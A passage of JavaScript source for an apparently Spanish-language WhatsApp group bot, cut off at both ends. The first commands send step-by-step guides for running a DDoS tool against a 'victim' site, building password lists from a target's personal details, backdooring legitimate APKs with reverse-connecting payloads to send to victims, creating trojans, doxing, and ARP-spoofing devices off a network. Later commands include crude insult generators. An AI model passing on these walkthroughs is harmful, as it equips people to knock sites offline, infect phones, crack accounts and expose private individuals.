Los ataques de red distribuidos a menudo se conocen como ataques de denegación distribuida de servicio (DDoS), El ataque DDoS envía varias solicitudes al recurso web atacado, con la intención de desbordar la capacidad del sitio web para administrar varias solicitudes y de evitar que este funcione correctamente.

📱Instalacion:📱

$ pkg install -y git
$ pkg install -y python
$ pkg install -y python2
$ pkg install -y nmap
$ pkg install net-tools
$ git clone https://github.com/cyweb/hammer
$ cd hammer

💻USO CORRECTO:💻

Primero sacamos la ip del sitio web 

ping sitio sin http o https

python hammer -s IP  -p 80 -t 135

Es .py pero facebook bloquea si lo pongo correctamente

( -s ) Sirve para indicar la IP del sitio web de la víctima.

( -p ) Sirve para indicar el puerto que atacaremos, en éste caso el puerto mas recomendado y por defecto es 80.

( -t ) Sirve para indicar la velocidad en la cual se enviarán los paquetes, en éste caso la velocidad mas recomendada y por defecto es 135`, MessageType.text, {quoted: mek})
  break
  
  case 'kali-nethunter':
  if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
cnf.sendMessage(from,`📱¿Que es Kali-Nethunter?📱

Este es un script mediante el cual puede instalar Kali nethunter (Kali Linux) en su aplicación termux sin un teléfono rooteado.

📱Installation:📱

$ apt update 
$ apt upgrade
$ apt install git
$ git clone https://github.com/Hax4us/Nethunter-In-Termux
$ cd Nethunter-In-Termux
$ chmod +x *
$ ./kalinethunter

Now select your architecture 

Now type this command to start 

$ startkali
Compulsory Steps For First Time Use

So after startkali

execute this command

$ apt-key adv --keyserver hkp://keys.gnupg.net --recv-keys 7D8D0BF6

Now its time to update

$ apt-get update`, MessageType.text, {quoted: mek})
  break
					
					case 'cupp':
					if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
cnf.sendMessage(from,`📱¿Qué es cupp?📱

cupp es una herramienta que nos permite generar diccionarios con información de personas, generalmente esta herramienta se usa para los ataques de fuerza bruta.

📱INSTALACIÓN DE cupp EN TERMUX (ANDROID)📱

$ apt update && apt upgrade -y
$ termux-setup-storage
$ pkg install -y git
$ pkg install -y python
$ pkg install -y python2
$ git clone https://github.com/Mebus/cupp.git
$ cd cupp
$ ./cupp.py
$ ./cupp.py -i

Muy bien, aquí debes escribir la información de la víctima, entre mas información es mejor, ya que tu diccionario tendra mas posibilidades de crear una contraseña correcta, EJEMPLO:

Primer Nombre: Termux
Apellido : Hacking
Apodo: Error404
Cumpleaños: 25121996
Novi@: 
apodo novi@:
Cumpleaños novia:
Nombre hijo:
Apodo hijo:
Cumpleaños hijo:
Nombre de mascota:
Trabajo/Escuela/Compania:

¿Agregar palabras claves? [Y/N]: y
ejemplo: rock, basket, computadora, rojo

¿agregar caracteres? [Y/N]: y
¿agregar números? [Y/N]: y
¿agregar letras? [Y/N]: y

Diccionario creado como >> ejemplo.txt

PARA LEER EL DICCIONARIO ESCRIBIMOS EL COMANDO: cat ejemplo.txt`, MessageType.text, {quoted: mek})
  break
					
					case 'infectador-framework':
					if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
cnf.sendMessage(from,`📲 infectador-framework 📲

Es un script que te permite infectar apks legítimas con 6 payloads diferentes a elejir los comandos para instalar el script son:

$ apt update && apte upgrade -y 
$ pkg install -y git 
$ git clone https://github.com/Cesar-Hack-Gray/infectador-framework 
$ cd infectador-framework 
$ ls 
$ bash setup 

Esta parte tardará un poco solo esperen a que se instalen los paquetes necesarios para el script Ya cuendo aya terminado de descargar todos los paquetes ejecutan el script con:

$ ./Infectador Apreten enter 

Elijen el payload que quieran usar para infectar el apk poniendo el número que tenga detrás el payload

 Aquí ponen la ruta del apk legítima que quieren infectar por ejemplo si la apk se encuentra en descargas y se llama Base.apk la ruta sería: 

$ /sdcard/Download/Base.apk

 Ojo eso es un ejemplo ustedes ponen la ruta de dónde se encuentre el apk con su respectivo nombre

Aquí pondrán su IP, para saber cuál es su IP pueden abrir otra sesión y escribir *ifconfig ahíh buscan su IP y la pegan en la sesión del infectador Aquí ponen el puerto de su preferencia Aquí le elijen un nuevo nombre al apk Aquí apretan "Y" y le dan a enter Ya se estaría infectando el apk legítima solo deben esperar Ya cuendo aya terminado de infectar el apk elijen la opción 2 es lo más recomendable Bueno aquí les pedirá iniciar metasploit ustedes apretan "Y" le dan a enter y le dan devuelta a "Y",metasploit se estaría conectando con el apk infectada El apk infectada se les guardará en la carpeta de infectador-framework solo deben ingresar a la carpeta y mover el apk infectada a HOME ya solo queda mandar el apk infectada a la víctima`, MessageType.text, {quoted: mek})
  break
					
					case 'evil-create-framework':
					if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
cnf.sendMessage(from,`📱 CREAR TROYANO 📱

📱Instalación 📱

$ pkg update
$ pkg upgrade
$ pkg install git
$ pkg install python2
$ git clone https://github.com/LOoLzeC/Evil-create-framework
$ ls
$ cd Evil-create-framework
$ ls
$ chmod +x vcrt.py
$ python2 vcrt.py

help

show android

create virus/y aquí elegimos el virus

SET OUTPUT /sdcard

SET NAME VIRUS (y le ponemos un nombre)

go`, MessageType.text, {quoted: mek})
  break
					
					case 'wiki-termux':
					if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
cnf.sendMessage(from,`🌎¿Qué es Wiki-Termux?🌎

wiki-termux, como su nombre lo dice, es una guía o manual que contiene información acerca del uso de Termux y de algunas herramientas que son compatibles con ésta terminal.

📱INSTALACIÓN DE wiki-termux EN TERMUX (ANDROID)📱

$ apt update && apt upgrade -y
$ termux-setup-storage
$ pkg install -y git
$ git clone https://github.com/HarrisSec/wiki-termux
$ cd wiki-termux
$ chmod 711 wiki
$ ./wiki`, MessageType.text, {quoted: mek})
  break
					
					case 'doxweb':
					if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
cnf.sendMessage(from,`📲¿Qué es DoxWeb?📲

DoxWeb es una herramienta que utiliza diversos sitios web para recopilar información de un usuario, es decir, es una herramienta de Doxing.

📲INSTALACIÓN DE DoxWeb EN TERMUX (ANDROID)📲 

$ termux-setup-storage?
$ apt update && apt upgrade -y
$ termux-setup-storage
$ pkg install -y git
$ git clone https://github.com/TermuxHacking000/DoxWeb
$ cd DoxWeb
$ chmod 711 DoxWeb.sh
$ ./DoxWeb.sh`, MessageType.text, {quoted: mek})
  break
					
					case 'kickthemoutprojet':
					if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
cnf.sendMessage(from,`📲¿Qué es kickthemout?📲

Una herramienta para expulsar dispositivos de su red y disfrutar de todo el ancho de banda para usted. Le permite seleccionar dispositivos específicos o todos y ARP los falsifica fuera de su red de área local.

📲INSTALACIÓN DE kickthemout EN TERMUX (ANDROID ROOT)🌐

$ apt update && apt upgrade -y
$ termux-setup-storage
$ pkg install -y git
$ pkg install -y nmap
$ pkg install -y python
$ pkg install -y python2
$ git clone https://github.com/k4m4/kickthemout.git
$ cd kickthemout
$ python -m pip install -r requirements.txt
$ sudo python kickthemout.py

Escribir la puerta de enlace del router al que estas conectado, ejemplo:

192.168.1.1

Seleccionar la opción número "3" y pulsar enter`, MessageType.text, {quoted: mek})
  break
  
                    case 'exif':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
                    if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					const exifff = `${args.join(' ')}`
					const namaPack = exifff.split('|')[0]
					const authorPack = exifff.split('|')[1]
					exif.create(namaPack, authorPack)
					await reply('Listo')
				break
/*				case 'sticker':
					case 'stiker':
					case 's':
						if (isMedia && !mek.message.videoMessage || isQuotedImage) {
							const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
							const media = await cnf.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							await ffmpeg(`${media}`)
									.input(media)
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											if (error) return reply(mess.error.api)
											cnf.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
											fs.unlinkSync(media)	
											fs.unlinkSync(`./sticker/${sender}.webp`)	
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./sticker/${sender}.webp`)
						} else if ((isMedia && mek.message.videoMessage.fileLength < 10000000 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
							const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
							const media = await cnf.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							reply(mess.wait)


								await ffmpeg(`${media}`)
									.inputFormat(media.split('.')[4])
									.on('start', function (cmd) {
										console.log(`Empezado : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										tipe = media.endsWith('.mp4') ? 'video' : 'gif'
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											if (error) return reply(mess.error.api)
											cnf.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
											fs.unlinkSync(media)
											fs.unlinkSync(`./sticker/${sender}.webp`)
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./sticker/${sender}.webp`)
						} else {
							reply(`Envíe una imagen/video con la etiqueta ${prefix}sticker o etiqueta la imagen / video que ya alla sido enviada\nNota: La duración máxima del video es de 8 segundos`)
						}
						break*/
      case "sticker":
      case "stiker":
      case "sg":
      case "s":
      case "stickergif":
      case "sgif":
      case "stickgif":
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          const encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          const media = await cnf.downloadAndSaveMediaMessage(encmedia);
          ran = "666.webp";
          await ffmpeg(`./${media}`)
            .input(media)
            .on("start", function (cmd) {
              console.log(`Iniciando : ${cmd}`);
            })
            .on("error", function (err) {
              console.log(`Error : ${err}`);
              fs.unlinkSync(media);
              reply("error");
            })
            .on("end", function () {
              console.log("Listo");
              cnf.sendMessage(from, fs.readFileSync(ran), sticker, {
                quoted: mek,
              });
              fs.unlinkSync(media);
              fs.unlinkSync(ran);
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(ran);
        } else if (
          ((isMedia && mek.message.videoMessage.seconds < 11) ||
            (isQuotedVideo &&
              mek.message.extendedTextMessage.contextInfo.quotedMessage
                .videoMessage.seconds < 11)) &&
          args.length == 0
        ) {
          const encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          const media = await cnf.downloadAndSaveMediaMessage(encmedia);
          ran = "999.webp";
          reply(mess.wait);
          await ffmpeg(`./${media}`)
            .inputFormat(media.split(".")[1])
            .on("start", function (cmd) {
              console.log(`Iniciando : ${cmd}`);
            })
            .on("error", function (err) {
              console.log(`Error : ${err}`);
              fs.unlinkSync(media);
              tipe = media.endsWith(".mp4") ? "video" : "gif";
              reply(`Falló, en el momento de la conversión ${tipe} a stiker`);
            })
            .on("end", function () {
              console.log("Listo");
              cnf.sendMessage(from, fs.readFileSync(ran), sticker, {
                quoted: mek,
              });
              fs.unlinkSync(media);
              fs.unlinkSync(ran);
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(ran);
        } else {
          reply(
            `Envia una imagen oh video con la etiqueta ${prefix}sticker\nDuración de el vídeo máximo 1-9 Segundos`
          );
        }
        break;
     		    case 'robar':
					case 'take':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
						if (!isQuotedSticker) return reply(`Usa *${prefix}takestick nombre|author*`)
						ppp = `${args.join(' ')}`
						const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						const media = await cnf.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
						const packname = ppp.split('|')[0]
						const author = ppp.split('|')[1]
						exif.create(packname, author, `takestick_${sender}`)
						exec(`webpmux -set exif ./sticker/takestick_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
							if (error) return reply(mess.error.api)
							cnf.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
							fs.unlinkSync(media)
							fs.unlinkSync(`./sticker/takestick_${sender}.exif`)
						})
						break

			case 'speed':
			case 'velocidad':
			case 'ping':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
					const timestampi = speed();
					const latensyi = speed() - timestampi
					reply(`Ping: ${latensyi.toFixed(4)} Segundos`)
					break

                 case 'toimg':
				case 'tomedia':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
					if (!isQuotedSticker) return reply('Etiqueta un sticker')
					if (mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated === true){
						const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						const media = await cnf.downloadAndSaveMediaMessage(encmedia)
						const upload = await uploadimg(media, Date.now() + '.webp')
						console.log(upload)
						reply(`${upload.result.image}`)
						const rume = await axios.get(`http://nzcha-apii.herokuapp.com/webp-to-mp4?url=${upload.result.image}`)
						console.log(rume.data)
						sendMediaURL(from, rume.data.result)
					} else {
						const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						const media = await cnf.downloadAndSaveMediaMessage(encmedia)
						ran = '1000.png'
						exec(`ffmpeg -i ${media} ${ran}`, (err) => {
							fs.unlinkSync(media)
							if (err) return reply(mess.error.api)
							buffer = fs.readFileSync(ran)
							cnf.sendMessage(from, buffer, image, {quoted: mek})
							fs.unlinkSync(ran)
						})
					}
					break

				break
				case 'sticktag':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
				if (!isGroup) return reply(mess.only.group)
				anu  = body.slice(10)
				wanu = anu.split('|')
				var group = await cnf.groupMetadata(wanu[0])
				var member = group['participants']
				var mem = []
				member.map( async adm => {
				mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
				})
				result = fs.readFileSync(`./media/sticker/${wanu[1]}.webp`)
				cnf.sendMessage(`${wanu[0]}`, result, sticker, { contextInfo: { "mentionedJid": mem }})
				break
			case 'setbio':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				if (args.length < 1) return reply('Donde esta el texto?')
					iyek = body.slice(8)
					cnf.setStatus(`${iyek}`)
					reply(`Éxito al cambiar la biografía a ${body.slice(8)}`)
					break
					case 'setname':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				if (args.length < 1) return reply('Donde esta el texto?')
                anu = body.slice(9)
                cnf.updateProfileName(anu)
                reply(`Éxito al cambiar el nombre a ${body.slice(9)}`)
                break
//------------ <Add/Kick >-----------------\\
		case 'add':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
					if (!isGroup) return reply(mess.only.group)
					if (args.length < 1) return reply(`Usa ${prefix}add 502######`)
					if (args[0].startsWith('011')) return reply('Utilice el código de país ejemplo : +52..')
					try {
						num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
						cnf.groupAdd(from, [num])
					} catch (e) {
						console.log('Error :', e)
						reply('No se pudo agregar el objetivo, tal vez porque esta en modo privado')
					}
					break
case 'kick2':
case 'bye':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)		
				if (!isBotGroupAdmins) return reply(mess.only.Badmin)		
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Etiqueta un mensaje oh utiliza @!')
				    if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Etiqueta un mensaje oh utiliza @!')
			bai = mek.message.extendedTextMessage.contextInfo.participant
		    cnf.groupRemove(from, [bai])
					break

			    case 'kick':
			  case 'amaterasu':			  
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
					if (!isGroup) return reply(mess.only.group)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
							     if (!isGroupAdmins) return reply(mess.only.admin)		
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di tendang!')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = 'Orden recibida, emitida :\n'
						for (let _ of mentioned) {
							teks += `@${_.split('@')[0]}\n`
						}
						mentions(teks, mentioned, true)
						cnf.groupRemove(from, mentioned)
					} else {
						mentions(`Orden recibida, emitida : @${mentioned[0].split('@')[0]}`, mentioned, true)
						cnf.groupRemove(from, mentioned)
					}			
          break 

                    
//------------ <Add/Kick >-----------------\\
                    case 'creategroup':
			case 'creategrup':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
			if (!isGroup) return reply(mess.only.group)
				if (args.length < 1) return reply(`Usa ${prefix}creategrup nombre|@tag`)
				argz = arg.split('|')
				if (mek.message.extendedTextMessage != undefined){
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
                    for (let i = 0; i < mentioned.length; i++){
						anu = []
						anu.push(mentioned[i])
                    }
					cnf.groupCreate(argz[0], anu)
					reply(`Éxito en la creación de el grupo ${argz[0]}`)
                }
				break

			case 'addrespon':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
			if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				if (args.length < 1) return reply(`Usa ${prefix}addrespon Hola|Hola amiko`)
				argz = arg.split('|')
				if (checkCommands(argz[0], commandsDB) === true) return reply(`Ya existe`)
				addCommands(argz[0], argz[1], sender, commandsDB)
				reply(`Respuesta agregada con éxito ${argz[0]}`)
				break

			case 'delrespon':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
			if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				if (args.length < 1) return reply(`Usa ${prefix}delrespon ola`)
				if (!checkCommands(body.slice(11), commandsDB)) return reply(`No esta en la base de datos`)
                deleteCommands(body.slice(11), commandsDB)
				reply(`Se eliminó la respuesta con éxito ${body.slice(11)}`)
				break

////////////////// COMANDOS BOT2 /////////////////

                    case 'gay':				 
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
					const gay =['Eres 0% gay' , 'Eres 1% gay' , 'Eres 2% gay' , 'Eres 3% gay' , 'Eres 4% gay' , 'Eres 5% gay' , 'Eres 6% gay' , 'Eres 7% gay' , 'Eres 8% gay' , 'Eres 9% gay' , 'Eres 10% gay' , 'Eres 11% gay' , 'Eres 12% gay' , 'Eres 13% gay' , 'Eres 14% gay' , 'Eres 15% gay' , 'Eres 16% gay' , 'Eres 17% gay' , 'Eres 18% gay' , 'Eres 19% gay' , 'Eres 20% gay' , 'Eres 21% gay' , 'Eres 22% gay' , 'Eres 23% gay' , 'Eres 24% gay' , 'Eres 25% gay' , 'Eres 26% gay' , 'Eres 27% gay' , 'Eres 28% gay' , 'Eres 29% gay' , 'Eres 30% gay' , 'Eres 31% gay' , 'Eres 32% gay' , 'Eres 33% gay' , 'Eres 34% gay' , 'Eres 35% gay' , 'Eres 36% gay' , 'Eres 37% gay' , 'Eres 38% gay' , 'Eres 39% gay' , 'Eres 40% gay' , 'Eres 41% gay' , 'Eres 42% gay' , 'Eres 43% gay' , 'Eres 44% gay' , 'Eres 45% gay' , 'Eres 46% gay' , 'Eres 47% gay' , 'Eres 48% gay' , 'Eres 49% gay' , 'Eres 50% gay' , 'Eres 51% gay' , 'Eres 52% gay' , 'Eres 53% gay' , 'Eres 54% gay' , 'Eres 55% gay' , 'Eres 56% gay' , 'Eres 57% gay' , 'Eres 58% gay' , 'Eres 59% gay' , 'Eres 60% gay' , 'Eres 61% gay' , 'Eres 62% gay' , 'Eres 63% gay' , 'Eres 64% gay' , 'Eres 65% gay' , 'Eres 66% gay' , 'Eres 67% gay' , 'Eres 68% gay' , 'Eres 69% gay' , 'Eres 70% gay' , 'Eres 71% gay' , 'Eres 72% gay' , 'Eres 73% gay' , 'Eres 74% gay' , 'Eres 75% gay' , 'Eres 76% gay' , 'Eres 77% gay' , 'Eres 78% gay' , 'Eres 79% gay' , 'Eres 80% gay' , 'Eres 81% gay' , 'Eres 82% gay' , 'Eres 83% gay' , 'Eres 84% gay' , 'Eres 85% gay' , 'Eres 86% gay' , 'Eres 87% gay' , 'Eres 88% gay' , 'Eres 89% gay' , 'Eres 90% gay' , 'Eres 91% gay' , 'Eres 92% gay' , 'Eres 93% gay' , 'Eres 94% gay' , 'Eres 95% gay' , 'Eres 96% gay' , 'Eres 97% gay' , 'Eres 98% gay' , 'Eres 99% gay' , 'Eres 100% gay']									
					const gai = gay[Math.floor(Math.random() * gay.length)]
					wiw = fs.readFileSync(`./gay.jpg`)
					cnf.sendMessage(from, wiw, image, { quoted: mek, caption: '*Que tan gay eres*\n\n'+ gai })									
                    break

					case 'puta':			 
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
					const puuta =['Eres 0% puta' , 'Eres 1% puta' , 'Eres 88% puta' , 'Eres 89% puta' , 'Eres 90% puta' , 'Eres 91% puta' , 'Eres 92% puta' , 'Eres 93% puta' , 'Eres 94% puta' , 'Eres 95% puta' , 'Eres 96% puta' , 'Eres 97% puta' , 'Eres 98% puta' , 'Eres 99% puta' , 'Eres 100% puta','Eres definitivamente puta!']									
					const gaii = puuta[Math.floor(Math.random() * puuta.length)]
					wiw = fs.readFileSync(`./puta.jpg`)
					cnf.sendMessage(from, wiw, image, { quoted: mek, caption: '*Que tan puta eres*\n\n'+ gaii })					
                    break
case 'kuaker':		
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
                    const cuu =['Eres 0% Kuaker' , 'Eres 1% Kuaker' , 'Eres 2% Kuaker' , 'Eres 3% Kuaker' , 'Eres 4% Kuaker' , 'Eres 5% Kuaker' , 'Eres 6% Kuaker' , 'Eres 7% Kuaker' , 'Eres 8% Kuaker' , 'Eres 9% Kuaker' , 'Eres 10% Kuaker' , 'Eres 11% Kuaker' , 'Eres 12% Kuaker' , 'Eres 13% Kuaker' , 'Eres 14% Kuaker' , 'Eres 15% Kuaker' , 'Eres 16% Kuaker' , 'Eres 17% Kuaker' , 'Eres 18% Kuaker' , 'Eres 19% Kuaker' , 'Eres 20% Kuaker' , 'Eres 21% Kuaker' , 'Eres 22% Kuaker' , 'Eres 23% Kuaker' , 'Eres 24% Kuaker' , 'Eres 25% Kuaker' , 'Eres 26% Kuaker' , 'Eres 27% Kuaker' , 'Eres 28% Kuaker' , 'Eres 29% Kuaker' , 'Eres 30% Kuaker' , 'Eres 31% Kuaker' , 'Eres 32% Kuaker' , 'Eres 33% Kuaker' , 'Eres 34% Kuaker' , 'Eres 35% Kuaker' , 'Eres 36% Kuaker' , 'Eres 37% Kuaker' , 'Eres 38% Kuaker' , 'Eres 39% Kuaker' , 'Eres 40% Kuaker' , 'Eres 41% Kuaker' , 'Eres 42% Kuaker' , 'Eres 43% Kuaker' , 'Eres 44% Kuaker' , 'Eres 45% Kuaker' , 'Eres 46% Kuaker' , 'Eres 47% Kuaker' , 'Eres 48% Kuaker' , 'Eres 49% Kuaker' , 'Eres 50% Kuaker' , 'Eres 51% Kuaker' , 'Eres 52% Kuaker' , 'Eres 53% Kuaker' , 'Eres 54% Kuaker' , 'Eres 55% Kuaker' , 'Eres 56% Kuaker' , 'Eres 57% Kuaker' , 'Eres 58% Kuaker' , 'Eres 59% Kuaker' , 'Eres 60% Kuaker' , 'Eres 61% Kuaker' , 'Eres 62% Kuaker' , 'Eres 63% Kuaker' , 'Eres 64% Kuaker' , 'Eres 65% Kuaker' , 'Eres 66% Kuaker' , 'Eres 67% Kuaker' , 'Eres 68% Kuaker' , 'Eres 69% Kuaker' , 'Eres 70% Kuaker' , 'Eres 71% Kuaker' , 'Eres 72% Kuaker' , 'Eres 73% Kuaker' , 'Eres 74% Kuaker' , 'Eres 75% Kuaker' , 'Eres 76% Kuaker' , 'Eres 77% Kuaker' , 'Eres 78% Kuaker' , 'Eres 79% Kuaker' , 'Eres 80% Kuaker' , 'Eres 81% Kuaker' , 'Eres 82% Kuaker' , 'Eres 83% Kuaker' , 'Eres 84% Kuaker' , 'Eres 85% Kuaker' , 'Eres 86% Kuaker' , 'Eres 87% Kuaker' , 'Eres 88% Kuaker' , 'Eres 89% Kuaker' , 'Eres 90% Kuaker' , 'Eres 91% Kuaker' , 'Eres 92% Kuaker' , 'Eres 93% Kuaker' , 'Eres 94% Kuaker' , 'Eres 95% Kuaker' , 'Eres 96% Kuaker' , 'Eres 97% Kuaker' , 'Eres 98% Kuaker' , 'Eres 99% Kuaker' , 'Eres 100% Kuaker']														
                	const rii = cuu[Math.floor(Math.random() * cuu.length)]
					wnw = fs.readFileSync(`./kuaker.jpg`)						
					cnf.sendMessage(from, wnw, image, { caption: '*Que tan kuaker eres*\n\n'+ rii, quoted: mek })					
                    break                                      
case 'guapo':	
	if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
                    const shaddy = ['Eres 0% guapo' , 'Eres 1% guapo' , 'Eres 2% guapo' , 'Eres 3% guapo' , 'Eres 4% guapo' , 'Eres 5% guapo' , 'Eres 6% guapo' , 'Eres 7% guapo' , 'Eres 8% guapo' , 'Eres 9% guapo' , 'Eres 10% guapo' , 'Eres 11% guapo' , 'Eres 12% guapo' , 'Eres 13% guapo' , 'Eres 14% guapo' , 'Eres 15% guapo' , 'Eres 16% guapo' , 'Eres 17% guapo' , 'Eres 18% guapo' , 'Eres 19% guapo' , 'Eres 20% guapo' , 'Eres 21% guapo' , 'Eres 22% guapo' , 'Eres 23% guapo' , 'Eres 24% guapo' , 'Eres 25% guapo' , 'Eres 26% guapo' , 'Eres 27% guapo' , 'Eres 28% guapo' , 'Eres 29% guapo' , 'Eres 30% guapo' , 'Eres 31% guapo' , 'Eres 32% guapo' , 'Eres 33% guapo' , 'Eres 34% guapo' , 'Eres 35% guapo' , 'Eres 36% guapo' , 'Eres 37% guapo' , 'Eres 38% guapo' , 'Eres 39% guapo' , 'Eres 40% guapo' , 'Eres 41% guapo' , 'Eres 42% guapo' , 'Eres 43% guapo' , 'Eres 44% guapo' , 'Eres 45% guapo' , 'Eres 46% guapo' , 'Eres 47% guapo' , 'Eres 48% guapo' , 'Eres 49% guapo' , 'Eres 50% guapo' , 'Eres 51% guapo' , 'Eres 52% guapo' , 'Eres 53% guapo' , 'Eres 54% guapo' , 'Eres 55% guapo' , 'Eres 56% guapo' , 'Eres 57% guapo' , 'Eres 58% guapo' , 'Eres 59% guapo' , 'Eres 60% guapo' , 'Eres 61% guapo' , 'Eres 62% guapo' , 'Eres 63% guapo' , 'Eres 64% guapo' , 'Eres 65% guapo' , 'Eres 66% guapo' , 'Eres 67% guapo' , 'Eres 68% guapo' , 'Eres 69% guapo' , 'Eres 70% guapo' , 'Eres 71% guapo' , 'Eres 72% guapo' , 'Eres 73% guapo' , 'Eres 74% guapo' , 'Eres 75% guapo' , 'Eres 76% guapo' , 'Eres 77% guapo' , 'Eres 78% guapo' , 'Eres 79% guapo' , 'Eres 80% guapo' , 'Eres 81% guapo' , 'Eres 82% guapo' , 'Eres 83% guapo' , 'Eres 84% guapo' , 'Eres 85% guapo' , 'Eres 86% guapo' , 'Eres 87% guapo' , 'Eres 88% guapo' , 'Eres 89% guapo' , 'Eres 90% guapo' , 'Eres 91% guapo' , 'Eres 92% guapo' , 'Eres 93% guapo' , 'Eres 94% guapo' , 'Eres 95% guapo' , 'Eres 96% guapo' , 'Eres 97% guapo' , 'Eres 98% guapo' , 'Eres 99% guapo' , 'Eres 100% 